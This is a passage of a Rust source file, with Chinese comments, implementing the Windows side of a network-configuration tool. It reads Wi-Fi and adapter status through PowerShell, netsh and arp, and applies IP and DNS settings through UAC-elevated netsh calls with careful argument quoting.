//! Windows 平台实现。
//!
//! 设计要点（为什么这么写）：
//!
//! 1. **读取优先走 PowerShell CIM cmdlet**（`Get-NetAdapter` / `Get-NetConnectionProfile`
//!    / `Get-NetIPConfiguration` …）而不是 `netsh` 的文本输出。
//!    原因：`netsh` 的输出是**本地化 + OEM 代码页**的，中文 Windows 下字段名和编码都会变，
//!    解析必然脆。CIM 是对象化的，语言无关，且我们显式把 stdout 编码钉成 UTF-8。
//!
//! 2. **写入走 `netsh`**（`interface ipv4 set address/dnsservers`）—— 这是 Windows 上改
//!    静态 IP/DNS 最稳定的入口。
//!
//! 3. **提权走 UAC**：把要执行的命令渲染成一段 PowerShell 脚本，
//!    用 `-EncodedCommand`（UTF-16LE base64，彻底避开引号/编码问题）交给
//!    `Start-Process -Verb RunAs` 以管理员身份执行，一次授权覆盖本批全部操作。
//!    网络配置批次默认先走常驻 helper（`win_helper`）：同一个会话只弹一次授权，
//!    helper 不可用时才透明退回上面这条逐批弹窗的通路。
//!
//! 4. **命令参数一律用 `@('a','b')` 数组传递**（`& netsh.exe @(...)`），
//!    不做字符串拼接，避免接口名含空格/特殊字符时被重新切分。

use super::{
    dedupe_sort_apps, poll_ssid_watch, prefers_dark_from_reg, printer_label, run, timeout_secs, AppEntry,
    Health, InterfaceStatus, NetworkPlatform, PrinterInfo, PrivChannel, ProbeTarget, TunnelTarget,
    WatcherHandle,
};
use crate::config::{Mode, NetworkConfig, V6Mode};
use crate::config::model::NetworkTarget;
use crate::i18n;
use std::sync::{Mutex, OnceLock};
use std::time::{Duration, Instant};

/// 状态快照缓存 TTL。
/// `resolve_current_name()` 一次要问 SSID + 网关 MAC + BSSID，而每次读取都要拉起一次
/// PowerShell（百毫秒级）。缓存让一次身份解析只付一次进程开销。
const CACHE_TTL: Duration = Duration::from_millis(1200);

fn cache() -> &'static Mutex<Option<(Instant, InterfaceStatus)>> {
    static C: OnceLock<Mutex<Option<(Instant, InterfaceStatus)>>> = OnceLock::new();
    C.get_or_init(|| Mutex::new(None))
}

// —————————————————————————— PowerShell 调用 ——————————————————————————

/// 执行一段 PowerShell 脚本并取回 stdout。
///
/// 脚本首行由本函数统一注入 `[Console]::OutputEncoding = UTF8`，
/// 保证含中文的返回值（SSID、适配器名）在 Rust 侧能正确按 UTF-8 解码。
/// 调用时**不要**在脚本里再执行 `netsh` 等原生命令（它们的输出是 OEM 代码页，
/// 会被 UTF-8 解码器解坏）；需要 netsh 文本时请直接从 Rust 调 `netsh` 并只取 ASCII 字段。
///
/// `pub(crate)` 是给 `win_helper` 拉起 helper 用的（`Start-Process -Verb RunAs` 本身
/// 也得由一条普通权限的 PowerShell 来说）。
pub(crate) fn ps(script: &str) -> Result<String, String> {
    let full = format!(
        "[Console]::OutputEncoding=[System.Text.Encoding]::UTF8;$ProgressPreference='SilentlyContinue';\r\n{}",
        script
    );
    run(
        "powershell.exe",
        &[
            "-NoProfile",
            "-NonInteractive",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            &full,
        ],
    )
}

/// PowerShell 单引号字符串字面量（内部 `'` 翻倍转义）。
pub(crate) fn psq(s: &str) -> String {
    format!("'{}'", s.replace('\'', "''"))
}

/// `@('a','b')` —— 参数数组字面量。永远用数组传参，不做字符串拼接。
fn ps_arr(items: &[&str]) -> String {
    let inner: Vec<String> = items.iter().map(|s| psq(s)).collect();
    format!("@({})", inner.join(","))
}

/// 给 **`Start-Process -ArgumentList`** 用的参数数组。与 [`ps_arr`] 不能混用一个：
///
/// `& netsh.exe @(...)` 那条路 PowerShell 会自己替带空格的参数补引号；
/// 而 `Start-Process -ArgumentList @(...)` 是把元素**用空格拼成一条命令行**交给子进程，
/// 补引号是子进程那边按 Win32 规则解析的事 —— 于是 `'C:\Program Files\a.bat'` 会在那里
/// 变成两个参数。这里显式给含空白（或含 `"`）的元素再包一层双引号，内部 `"` 按 `\"` 转义。
/// `pub(crate)` 同样是给 `win_helper` 拉起自身用的。
pub(crate) fn ps_exec_arr(items: &[&str]) -> String {
    let inner: Vec<String> = items.iter().map(|s| ps_exec_arg(s)).collect();
    format!("@({})", inner.join(","))
}

fn ps_exec_arg(s: &str) -> String {
    if !s.chars().any(char::is_whitespace) && !s.contains('"') {
        return psq(s);
    }
    // 外层单引号是 PowerShell 的字面量（内部 `'` 翻倍），里层双引号才是子进程看到的引号
    psq(&format!("\"{}\"", s.replace('"', "\\\"")))
}

/// 一行 `netsh.exe` 调用 + 退出码检查（失败即终止整段脚本，避免"部分成功"被当成功）。
fn netsh_line(args: &[&str]) -> String {
    format!(
        "& netsh.exe {}; if ($LASTEXITCODE -ne 0) {{ throw \"netsh exit $LASTEXITCODE\" }};",
        ps_arr(args)
    )
}

/// `-PrefixLength` 只接受整数。在配置进入 PowerShell 之前把 `v6prefix` 收敛成数字：
/// 既给出按界面语言写出的报错，也彻底排除了向 `-PrefixLength` 后面追加 PowerShell 语句的可能。
fn parse_prefix_len(s: &str) -> Result<String, String> {
    match s.trim().parse::<u32>() {
        Ok(n) if n <= 128 => Ok(n.to_string()),
        Ok(n) => Err(i18n::tf("pal.v6prefix_range", &[("n", &n.to_string())])),
        Err(_) => Err(i18n::tf("pal.v6prefix_not_int", &[("s", s)])),
    }
}

/// 标准 base64 编码（自带实现，避免为一个小工具引入依赖）。
fn base64_encode(data: &[u8]) -> String {
    const T: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity(data.len().div_ceil(3) * 4);
    for chunk in data.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = *chunk.get(1).unwrap_or(&0) as u32;
        let b2 = *chunk.get(2).unwrap_or(&0) as u32;
        let n = (b0 << 16) | (b1 << 8) | b2;
        out.push(T[((n >> 18) & 63) as usize] as char);
        out.push(T[((n >> 12) & 63) as usize] as char);
        out.push(if chunk.len() > 1 {
            T[((n >> 6) & 63) as usize] as char
        } else {
            '='
        });
        out.push(if chunk.len() > 2 {
            T[(n & 63) as usize] as char
        } else {
            '='
        });
    }
    out
}

/// UTF-16LE + base64，供 PowerShell `-EncodedCommand` 使用。
/// `pub(crate)`：helper 服务端（`win_helper`）执行的就是这条编码通路。
pub(crate) fn encode_command(script: &str) -> String {
    let mut bytes = Vec::with_capacity(script.len() * 2 + 2);
    for u in script.encode_utf16() {
        bytes.extend_from_slice(&u.to_le_bytes());
    }
    base64_encode(&bytes)
}

/// 以管理员身份执行一段 PowerShell 脚本（弹 UAC），失败返回可读错误。
fn run_elevated_ps(body: &str) -> Result<(), String> {
    let inner = format!(
        "$ErrorActionPreference='Stop';\r\n[Console]::OutputEncoding=[System.Text.Encoding]::UTF8;\r\n{}\r\n",
        body
    );
    let b64 = encode_command(&inner);
    // ExitCode 1223 = ERROR_CANCELLED（用户点了"否"）。只有 UAC 真的被取消才落这个码；
    // 脚本/目标本身起不来（文件缺失、路径错）走 catch 但属于别的失败，必须退出非 1223，
    // 否则上层会把它也报成「用户点了否」，误导排查（审计 W6）。
    let outer = format!(
        "$ErrorActionPreference='Stop';\
         try {{ $p = Start-Process -FilePath 'powershell.exe' -Verb RunAs -Wait -PassThru -WindowStyle Hidden \
         -ArgumentList @('-NoProfile','-NonInteractive','-ExecutionPolicy','Bypass','-EncodedCommand','{}'); \
         exit $p.ExitCode }} \
         catch {{ $ex = $_.Exception; \
         if ($ex.HResult -eq -2147023673 -or ($ex.Message -match 'cancel')) {{ exit 1223 }} else {{ exit 1 }} }}",
        b64
    );
    match run(
        "powershell.exe",
        &[
            "-NoProfile",
            "-NonInteractive",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            &outer,
        ],
    ) {
        Ok(_) => Ok(()),
        Err(e) => Err(uac_cancelled(e)),
    }
}

/// UAC 被用户点掉时的那条报错（外层脚本把取消编码成退出码 1223 = ERROR_CANCELLED）。
/// `pub(crate)` 也给 `win_helper` 复用：拉起 helper 被取消时的口径必须和这里一致。
pub(crate) fn uac_cancelled(e: String) -> String {
    if e.contains("1223") {
        i18n::t("pal.uac_cancelled")
    } else {
        i18n::tf("pal.elevate_failed", &[("error", &e)])
    }
}

/// 以管理员身份执行**一个目标程序**（用户脚本走这条），全程只弹一次 UAC。
///
/// 为什么不复用 [`run_elevated_ps`]：那条是「先提权一个 powershell，再把脚本丢给它」，
/// 而已经提权的进程里再来一次 `-Verb RunAs` 会弹**第二个**授权框 —— 用户在两秒内看到
/// 两个一模一样的框，第一反应是自己点错了什么。这里让那个普通的 powershell 直接提权
/// 目标本身：一次授权，目标退出码照样拿得回来。
fn run_elevated_target(file: &str, args: &[&str]) -> Result<(), String> {
    let script = format!(
        "$ErrorActionPreference='Stop';\
         try {{ $p = Start-Process -FilePath {} -ArgumentList {} -Verb RunAs -Wait -PassThru; \
         exit $p.ExitCode }} \
         catch {{ $ex = $_.Exception; \
         if ($ex.HResult -eq -2147023673 -or ($ex.Message -match 'cancel')) {{ exit 1223 }} else {{ exit 1 }} }}",
        psq(file),
        ps_exec_arr(args)
    );
    match ps(&script) {
        Ok(_) => Ok(()),
        Err(e) => Err(uac_cancelled(e)),
    }
}

/// 当前是否以管理员身份运行（决定 `PrivChannel`）。
fn is_admin() -> bool {
    // 用 .NET 判组身份，比 `net session` 之类的探测更快且无副作用。
    ps("$id=[Security.Principal.WindowsIdentity]::GetCurrent();\
        $p=New-Object Security.Principal.WindowsPrincipal($id);\
        if ($p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { '1' } else { '0' }")
        .map(|s| s.trim() == "1")
        .unwrap_or(false)
}

/// 当前特权通道：已是管理员 → Direct（无弹窗）；否则 → Prompt（UAC）。
pub fn priv_channel() -> PrivChannel {
    static C: OnceLock<PrivChannel> = OnceLock::new();
    *C.get_or_init(|| {
        if is_admin() {
            PrivChannel::Direct
        } else {
            PrivChannel::Prompt
        }
    })
}

// —————————————————————————— 读取：接口与状态 ——————————————————————————

/// 解析 CIM 查询返回的 JSON 对象（取第一条记录）。
fn parse_json_object(out: &str) -> Option<serde_json::Value> {
    let t = out.trim();
    if t.is_empty() {
        return None;
    }
    serde_json::from_str::<serde_json::Value>(t).ok()
}

/// 解析 [`WindowsPlatform::list_known_ssids`] 那份 JSON 字符串数组。
///
/// 只有一条记录时 PowerShell 会把数组退化成一个对象（本文件里 `list_interfaces` 与
/// `list_adapters` 都做过同一处理），两种写法都收。值要 `trim` 并丢掉空白项：下拉里一条
/// 空白既选不中，也没法向用户解释它是什么。
fn parse_ssid_values(raw: &str) -> Vec<String> {
    let Ok(v) = serde_json::from_str::<serde_json::Value>(raw.trim()) else {
        return Vec::new();
    };
    let items: Vec<&serde_json::Value> = match &v {
        serde_json::Value::Array(a) => a.iter().collect(),
        serde_json::Value::Null => Vec::new(),
        other => vec![other],
    };
    let mut out: Vec<String> = items
        .into_iter()
        .filter_map(|x| x.as_str())
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .collect();
    out.sort();
    out.dedup();
    out
}

/// 当前无线适配器名。`MediaType = 'Native 802.11'` 是 Wi-Fi 的语言无关判据。
///
/// 多张 Wi-Fi 网卡时优先挑**已连上**的那张（`Status -eq 'Up'`），否则会把下发落到一张
/// 没在用的卡上、看起来像「点了没反应」。没有已连接的再退回第一张 Wi-Fi 适配器（尽力而为）。
fn wifi_iface() -> Option<String> {
    let out = ps("$ErrorActionPreference='SilentlyContinue';\
         $a = Get-NetAdapter -Physical | Where-Object { $_.MediaType -eq 'Native 802.11' -and $_.Status -eq 'Up' } | Select-Object -First 1;\
         if (-not $a) { $a = Get-NetAdapter -Physical | Where-Object { $_.MediaType -eq 'Native 802.11' } | Select-Object -First 1 };\
         if (-not $a) { $a = Get-NetAdapter | Where-Object { $_.Name -match 'Wi-?Fi|WLAN|Wireless' -and $_.Status -eq 'Up' } | Select-Object -First 1 };\
         if (-not $a) { $a = Get-NetAdapter | Where-Object { $_.Name -match 'Wi-?Fi|WLAN|Wireless' } | Select-Object -First 1 };\
         if ($a) { $a.Name }")
        .ok()?;
    let name = out.lines().map(|l| l.trim()).find(|l| !l.is_empty())?;
    Some(name.to_string())
}

/// 当前默认出口适配器名。
fn primary_iface() -> Option<String> {
    ps("Get-NetRoute -DestinationPrefix '0.0.0.0/0' | Sort-Object RouteMetric | Select-Object -First 1 | ForEach-Object { (Get-NetAdapter -InterfaceIndex $_.InterfaceIndex).Name }")
        .ok()?
        .lines()
        .map(|l| l.trim())
        .find(|l| !l.is_empty())
        .map(|s| s.to_string())
}

/// 当前以太网适配器名（挑已连接的）。
fn ethernet_iface() -> Option<String> {
    let out = ps("$ErrorActionPreference='SilentlyContinue';\
         $a = Get-NetAdapter -Physical | Where-Object { $_.MediaType -ne 'Native 802.11' -and $_.Status -eq 'Up' } | Select-Object -First 1;\
         if (-not $a) { $a = Get-NetAdapter | Where-Object { $_.Name -match 'Ethernet|LAN' -and $_.Status -eq 'Up' } | Select-Object -First 1 };\
         if ($a) { $a.Name }")
        .ok()?;
    out.lines()
        .map(|l| l.trim())
        .find(|l| !l.is_empty())
        .map(|s| s.to_string())
}

/// 「profile 名 → 空中 SSID」这张表由 WLAN profile 文件自己给，拼在读状态与读网卡的脚本前面。
///
/// 为什么不走 `netsh wlan show interfaces`：那是本地化文本 + OEM 代码页（模块头的规矩就是
/// 因此立的），而 `%ProgramData%\Microsoft\Wlansvc\Profiles\Interfaces\<guid>\*.xml` 是磁盘上
/// 的 UTF-8 文件，`[xml]` 解析与系统语言无关。隐藏网络那一档 XML 里只有 `<hex>`，按字节解回
/// UTF-8；再解不动就丢掉这一条，让调用方退回 profile 名 —— 宁可少一格信息。
///
/// 一趟把所有 profile 都收进哈希表，是因为这两处脚本每张网卡都要问一次名字：按卡起子进程
/// 会把「读一次状态」变成 N 次 netsh，而编辑器要看着当前 SSID 立刻变（那条教训见
/// `fresh_status` 的注释）。跨接口 GUID 目录合并成一张表时按「先到先得」去重：profile 名在
/// 两台接口上指的是同一个 SSID 才是常态，而这里要的也只是名字，不是身份。
///
/// PowerShell 的 `@{}` 哈希表按**不区分大小写**取键，而 profile 名在 Windows 上本就不区分
/// 大小写 —— 这一点是白得的，也别反过来依赖它：调用方只拿它查名字。变量名全部带 `wlan`
/// 前缀：这段要和调用方的脚本共用一个会话，`$i`、`$f` 这类名字撞进去，症状是网卡清单少几行。
///
/// 读不动这个目录（权限、或这台机器根本没存过 profile）时表就是空的：`$wlanNames` 那份
/// profile 名列表因此成为候选下拉的来源，现连 SSID 那两格也退回 profile 名 —— 与修改前的
/// 行为一致，不会更差，而这一趟本来就要把目录走到底，收集它不花第二次子进程。
const WLAN_SSID_MAP_PS: &str = r#"$ErrorActionPreference='SilentlyContinue';
$wlanSsid=@{};
$wlanNames=@();
$wlanDir=Join-Path $env:ProgramData 'Microsoft\Wlansvc\Profiles\Interfaces';
if (Test-Path -LiteralPath $wlanDir) {
 foreach ($wlanFile in @(Get-ChildItem -LiteralPath $wlanDir -Recurse -Filter *.xml -ErrorAction SilentlyContinue)) {
  try {
   $wlanXml=[xml][System.IO.File]::ReadAllText($wlanFile.FullName);
   $wlanName=[string]$wlanXml.WLANProfile.name;
   if (-not $wlanName) { continue };
   $wlanNames += $wlanName;
   $wlanSsidEl=@($wlanXml.WLANProfile.SSIDConfig.SSID) | Select-Object -First 1;
   $wlanSsidText=[string]$wlanSsidEl.name;
   if (-not $wlanSsidText) {
    $wlanHex=[string]$wlanSsidEl.hex;
    if ($wlanHex -and (($wlanHex.Length % 2) -eq 0)) {
     $wlanBytes=[byte[]]::new([int]($wlanHex.Length/2));
     for ($wlanI=0; $wlanI -lt $wlanBytes.Length; $wlanI++) { $wlanBytes[$wlanI]=[System.Convert]::ToByte($wlanHex.Substring($wlanI*2,2),16) };
     $wlanSsidText=[System.Text.Encoding]::UTF8.GetString($wlanBytes)
    }
   };
   $wlanSsidText=([string]$wlanSsidText).Trim();
   if ($wlanSsidText -and -not $wlanSsid.ContainsKey($wlanName)) { $wlanSsid[$wlanName]=$wlanSsidText };
  } catch {}
 }
}"#;

/// `netsh wlan show interfaces` 文本 → 「网卡 MAC（[`normalize_mac`] 形态）→ 当前 SSID」。
///
/// 为什么「当前 SSID」这一格单独回到 netsh：CIM 那份 `Get-NetConnectionProfile.Name` 是
/// **NLA 网络名**，不是空中的 SSID —— 网络签名一变（驱动重载、网关变更、VPN 介入），
/// NLA 就给同一个网络新建一个对象并加 ` 2`、` 3` 消歧，界面上于是出现一个设备上根本不
/// 存在的名字。netsh 的 `SSID` 行才是关联状态本身。字段名 `SSID` / `BSSID` 在任何语言下
/// 都是拉丁文（本函数上方取 BSSID 的旧代码就依赖这一点），本地化的只是别人。
///
/// 值的编码仍是控制台 OEM 代码页（中文 Windows 是 936），[`run`] 按 UTF-8 解：
/// ASCII 的 SSID 原样通过；一旦解出替换字符（`U+FFFD`）就说明它不全是 ASCII，我们无法
/// 保证没被解坏 —— 这一段整条丢掉，调用方退回 profile XML 里的名字（磁盘上的 UTF-8，
/// 编码上绝不会错）。宁可少一格信息，也不要显示一个错名字。
///
/// 归属按每段接口块里**第一个** MAC 形态的串（`Physical address` 行）算，不是按顺序猜：
/// BSSID 行带着 `BSSID` 字样会被跳过，GUID 行不是六个两字符的组也匹配不上。
/// 这样多张 Wi-Fi 网卡同时在用时，各自的 SSID 不会串到对方头上。
/// 在 `netsh wlan show interfaces` 的文本里，只取**当前这张卡所在接口块**的 BSSID 与信号。
///
/// 多张 Wi-Fi 网卡同时在线时，文本里会有多个接口块；BSSID / 信号必须跟着 SSID 同一套
/// 纪律 —— 按本机 MAC 认领，绝不能像原来那样取「全文最后一个 BSSID / 第一个 `%`」（审计
/// W5：那样 BSSID 可能来自另一张卡，而 BSSID 既是一个匹配条件、又进指纹）。
///
/// 块边界是空行；每块第一个非 BSSID 的 MAC 形态串就是「Physical address」，命中本机 MAC
/// 才把该块内的 BSSID / Signal 收进来。
fn netsh_bssid_rssi_for_mac(text: &str, mac: &str) -> (Option<String>, Option<i32>) {
    let mac = super::normalize_mac(mac);
    let mut cur_mac: Option<String> = None;
    let mut bssid: Option<String> = None;
    let mut rssi: Option<i32> = None;
    let mut matched = false;
    for line in text.lines().chain(std::iter::once("")) {
        if line.trim().is_empty() {
            if matched {
                break; // 目标块已收完
            }
            cur_mac = None;
            bssid = None;
            rssi = None;
            continue;
        }
        let t = line.trim_start();
        if cur_mac.is_none() && !t.contains("BSSID") {
            if let Some(m) = super::extract_mac(line) {
                let m = super::normalize_mac(&m);
                if m == mac {
                    matched = true;
                }
                cur_mac = Some(m);
            }
        }
        if matched {
            if t.starts_with("BSSID") {
                if let Some((_, v)) = t.split_once(':') {
                    if let Some(m) = super::extract_mac(v) {
                        bssid = Some(super::normalize_mac(&m));
                    }
                }
            } else if t.starts_with("Signal") || t.starts_with("信号") {
                if let Some(pct) = percent_in(t) {
                    rssi = Some(pct / 2 - 100);
                }
            }
        }
    }
    (bssid, rssi)
}

fn netsh_ssids_by_mac(text: &str) -> std::collections::BTreeMap<String, String> {
    let mut out = std::collections::BTreeMap::new();
    let mut mac: Option<String> = None;
    let mut ssid: Option<String> = None;
    // 末尾补一个空行：最后一个接口块也要落账
    for line in text.lines().chain(std::iter::once("")) {
        if line.trim().is_empty() {
            if let (Some(m), Some(s)) = (mac.take(), ssid.take()) {
                out.insert(m, s);
            }
            mac = None;
            ssid = None;
            continue;
        }
        let t = line.trim_start();
        if t.starts_with("SSID") {
            if let Some((_, v)) = t.split_once(':') {
                let v = v.trim();
                if !v.is_empty() && !v.contains('\u{FFFD}') {
                    ssid = Some(v.to_string());
                }
            }
            continue;
        }
        if mac.is_none() && !t.contains("BSSID") {
            if let Some(m) = super::extract_mac(line) {
                mac = Some(super::normalize_mac(&m));
            }
        }
    }
    out
}

/// 读取一次完整状态快照（一次 PowerShell 调用取全部字段）。
fn read_status() -> InterfaceStatus {
    let script = format!(
        "{}\n{}",
        WLAN_SSID_MAP_PS,
        r#"$ErrorActionPreference='SilentlyContinue';
$ad = Get-NetAdapter -Physical | Where-Object { $_.MediaType -eq 'Native 802.11' } | Select-Object -First 1;
if (-not $ad) { $ad = Get-NetAdapter | Where-Object { $_.Name -match 'Wi-?Fi|WLAN|Wireless' } | Select-Object -First 1 }
if (-not $ad) { '{}' ; exit }
$idx = $ad.ifIndex;
$prof = Get-NetConnectionProfile -InterfaceIndex $idx;
$ip   = Get-NetIPAddress -InterfaceIndex $idx -AddressFamily IPv4 | Where-Object { $_.PrefixOrigin -ne 'WellKnown' } | Select-Object -First 1;
$dns  = Get-DnsClientServerAddress -InterfaceIndex $idx -AddressFamily IPv4;
$v6   = Get-NetIPInterface -InterfaceIndex $idx -AddressFamily IPv6 | Select-Object -First 1;
$rt   = Get-NetRoute -InterfaceIndex $idx -AddressFamily IPv4 -DestinationPrefix '0.0.0.0/0' | Sort-Object RouteMetric | Select-Object -First 1;
[pscustomobject]@{
  iface   = $ad.Name;
  mac     = $ad.MacAddress;
  prof    = $prof.Name;
  ssid    = $wlanSsid[[string]$prof.Name];
  ipv4    = $ip.IPAddress;
  prefix  = $ip.PrefixLength;
  gateway = $rt.NextHop;
  dns     = ($dns.ServerAddresses -join ',');
  v6dhcp  = $v6.Dhcp
} | ConvertTo-Json -Compress"#
    );

    let mut st = InterfaceStatus::default();
    let Some(v) = ps(&script).ok().and_then(|o| parse_json_object(&o)) else {
        return st;
    };
    let get = |k: &str| -> Option<String> {
        v.get(k)
            .and_then(|x| x.as_str())
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
    };

    st.iface = get("iface");
    // 三层来源，按可靠度排：netsh 的 SSID 行（关联状态本身，下面的 netsh 调用里取）>
    // WLAN profile XML 里的空中名字（按 profile 名查，见 `WLAN_SSID_MAP_PS`）>
    // profile 名（`Get-NetConnectionProfile` 回答的那个，撞名时可能带 ` 2`）。
    st.ssid = get("ssid").or_else(|| get("prof"));
    st.ipv4 = get("ipv4");
    st.gateway = get("gateway");
    st.dns = get("dns");
    st.netmask = v
        .get("prefix")
        .and_then(|x| x.as_u64())
        .and_then(|p| prefix_to_mask(p as u32));
    st.v6mode = match get("v6dhcp").as_deref() {
        Some("Enabled") => Some("automatic".to_string()),
        Some("Disabled") => Some("manual".to_string()),
        _ => None,
    };

    // BSSID / 信号强度：只从 netsh 文本里取 ASCII 字段（MAC、百分比），
    // 因此不受中文 Windows 的本地化/代码页影响。同一份文本里顺带取当前 SSID。
    //
    // 注意这里用 `has_iface` 布尔量而不是 `if let Some(x) = &st.iface`：
    // 后者会让 `st.iface` 在整个块内保持不可变借用，而块内又要写 `st.bssid` 等字段，
    // 触发 E0502（借用了 st 又可变借用 st）。
    if st.iface.is_some() {
        if let Ok(text) = run("netsh", &["wlan", "show", "interfaces"]) {
            // 按这台 Wi-Fi 网卡的 MAC 认领 SSID：多张无线网卡同时在用时，
            // 「第一行 SSID」可能属于另一张卡。
            if let Some(name) = get("mac")
                .map(|m| super::normalize_mac(&m))
                .and_then(|m| netsh_ssids_by_mac(&text).get(&m).cloned())
            {
                st.ssid = Some(name);
            }
            // BSSID / 信号按本机 MAC 认领：多无线网卡时绝不能用「全文最后一个 BSSID /
            // 第一个 %」（审计 W5——那样 BSSID 会串到另一张卡上，而它既是一个匹配条件
            // 又进指纹）。这里用本机 MAC 定位接口块，只收那一块里的 BSSID 与 Signal。
            if let Some(mac) = get("mac").as_ref().map(|m| super::normalize_mac(m)) {
                let (bssid, rssi) = netsh_bssid_rssi_for_mac(&text, &mac);
                st.bssid = bssid;
                st.rssi = rssi;
            }
        }
        // 先算成 owned 值再赋值，避免同时借用 st.gateway 与写 st.gateway_mac
        let gm = st.gateway.as_deref().and_then(gateway_mac_for);
        st.gateway_mac = gm;
    }
    // 连没连上：SSID 是那个「只有连着才有」的量，因此它有没有值就是连接状态。
    // 放在 netsh 之后算 —— 那一步可能刚把它填上。
    st.connected = st.ssid.is_some();
    st
}

/// 取行内第一个 `NN%` 的数值。
fn percent_in(line: &str) -> Option<i32> {
    let bytes = line.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' {
            // 向前回溯数字
            let mut j = i;
            while j > 0 && bytes[j - 1].is_ascii_digit() {
                j -= 1;
            }
            if j < i {
                return std::str::from_utf8(&bytes[j..i]).ok()?.parse::<i32>().ok();
            }
        }
        i += 1;
    }
    None
}

/// 前缀长度 → 点分掩码。
fn prefix_to_mask(prefix: u32) -> Option<String> {
    if prefix > 32 {
        return None;
    }
    let bits: u32 = if prefix == 0 {
        0
    } else {
        u32::MAX << (32 - prefix)
    };
    Some(format!(
        "{}.{}.{}.{}",
        (bits >> 24) & 0xFF,
        (bits >> 16) & 0xFF,
        (bits >> 8) & 0xFF,
        bits & 0xFF
    ))
}

/// 媒体类型 + 描述 + 适配器名 → 网卡种类。
///
/// 两份脚本（在用网卡、本机网卡）的行共用这一份判据：各写一份就会出现「面板说是 VPN、
/// 下拉说是别的」这种分歧，而用户在两个界面之间来回核对时正是靠这个标签。
fn kind_from_row(media: &str, desc: &str, name: &str) -> super::NicKind {
    if media == "Native 802.11" {
        super::NicKind::Wireless
    } else if super::guess_vpn_app(desc).is_some() || super::guess_vpn_app(name).is_some() {
        super::NicKind::Vpn
    } else if media == "802.3" || desc.to_ascii_lowercase().contains("ethernet") {
        super::NicKind::Wired
    } else {
        super::NicKind::Other
    }
}

/// 一行网卡快照（脚本 `NIC_ROWS_PS_BODY` 的一个对象）→ 界面用的 `NicInfo`。
///
/// 返回 `None` 表示这一行**没有可核对的信息**：一张没在用、也没有地址的适配器，
/// 出现在清单上只会挤掉真正那几张。例外是 VPN —— 没连上的隧道同样值得列出来，
/// 因为「装了但没连」正是 3B2 与托盘都要看见的状态。
///
/// `up` 取自 `Status`，不再写死 `true`：以前能进到这个函数的行必然是 `Up`（筛选在
/// PowerShell 里做完了），所以现在多了「已知的虚拟口」这一类，状态必须原样带出来。
///
/// `ssid_by_mac` 是 `netsh wlan show interfaces` 那份「网卡 MAC → 当前 SSID」：
/// 这张卡的 MAC 命中就用它（关联状态本身），否则退回 profile XML 的名字，再退回 profile 名。
/// 匹配在 Rust 里做、不进 PowerShell：MAC 的归一化（大小写、分隔符）只有一份实现。
fn nic_from_row(
    r: &serde_json::Value,
    ssid_by_mac: &std::collections::BTreeMap<String, String>,
) -> Option<super::NicInfo> {
    let get = |k: &str| -> Option<String> {
        r.get(k)
            .and_then(|x| x.as_str())
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
    };
    let name = get("name")?;
    let ipv4 = get("ip");
    let ipv6 = get("v6");
    let media = get("media").unwrap_or_default();
    let desc = get("desc").unwrap_or_default();
    // 三层来源（与 `read_status` 同一口径）：netsh 按 MAC 认领 > profile XML 的空中名字 > profile 名
    let ssid = get("mac")
        .map(|m| super::normalize_mac(&m))
        .and_then(|m| ssid_by_mac.get(&m).cloned())
        .or_else(|| get("ssid"))
        .or_else(|| get("prof"));
    let up = get("status").is_some_and(|s| s.eq_ignore_ascii_case("Up"));

    let kind = kind_from_row(&media, &desc, &name);
    if kind != super::NicKind::Vpn && ipv4.is_none() && ipv6.is_none() && ssid.is_none() {
        return None;
    }

    let gateway = get("gw");
    // `::` 是 VPN / 点到点适配器的 on-link 下一跳：Windows 上它的意思是「没有网关」，
    // 与 macOS 的 `link#N` 同类，收了就会在面板上摆出一行不是地址的「网关」。
    let gateway6 = get("gw6").filter(|g| g != "::");
    // 路由前缀：脚本那边把这张口的 IPv4 前缀用逗号拼成一串送来（见 `NIC_ROWS_PS_BODY`）。
    // 上限截在这里而不是脚本里：脚本写死的数字会和 `MAX_ROUTES_PER_IFACE` 各走各的。
    let mut routes: Vec<String> = get("routes")
        .map(|s| {
            s.split(',')
                .map(|p| p.trim().to_string())
                .filter(|p| !p.is_empty())
                .collect()
        })
        .unwrap_or_default();
    routes.truncate(super::MAX_ROUTES_PER_IFACE);
    let gateway_mac = gateway.as_deref().and_then(gateway_mac_for);
    let netmask = r
        .get("prefix")
        .and_then(|x| x.as_u64())
        .and_then(|p| prefix_to_mask(p as u32));

    // VPN 归属要在 `name` 搬进 `NicInfo` 之前算完：这个函数只有 Windows 腿会编译，
    // 写在字面量字段里就是一次 use-after-move。
    let app = if kind == super::NicKind::Vpn {
        super::guess_vpn_app(&desc)
            .or_else(|| super::guess_vpn_app(&name))
            .map(|s| s.to_string())
    } else {
        None
    };

    Some(super::NicInfo {
        name,
        label: if desc.is_empty() { None } else { Some(desc) },
        kind,
        up,
        ssid: if kind == super::NicKind::Wireless { ssid } else { None },
        mac: get("mac"),
        ipv4,
        netmask,
        ipv6,
        gateway,
        gateway6,
        routes,
        gateway_mac,
        dns: get("dns"),
        app,
    })
}

/// 网关 IP → MAC（`arp -a` 邻居表；输出仅取 MAC 形态字符串，编码无关）。
fn gateway_mac_for(gw: &str) -> Option<String> {
    let out = run("arp", &["-a"]).ok()?;
    for line in out.lines() {
        if !has_ip_token(line, gw) {
            continue;
        }
        if let Some(m) = super::extract_mac(line) {
            return Some(m);
        }
    }
    None
}

/// 行内是否出现**独立成词**的该 IP 串。
///
/// 不能用 `line.contains(gw)`：网关 `192.168.1.1` 会命中本机地址 `192.168.1.10`
/// 所在的行，于是 `arp -a` 的**接口表头**「接口: 192.168.1.10 --- 0x10」也被拉进
/// 扫描 —— 那行整行是中文（CP936 → U+FFFD），这正是启动即退的实际触发点；
/// 更隐蔽的是当网关是 `10.0.0.1` 时会命中 `10.0.0.10` 那一行，把**别的邻居**
/// 的 MAC 当成网关 MAC 返回（错配到错误的 profile）。
///
/// 按"非 IP 字符"切词再整体比较，前缀误命中自然消失，且不受本地化影响。
fn has_ip_token(line: &str, ip: &str) -> bool {
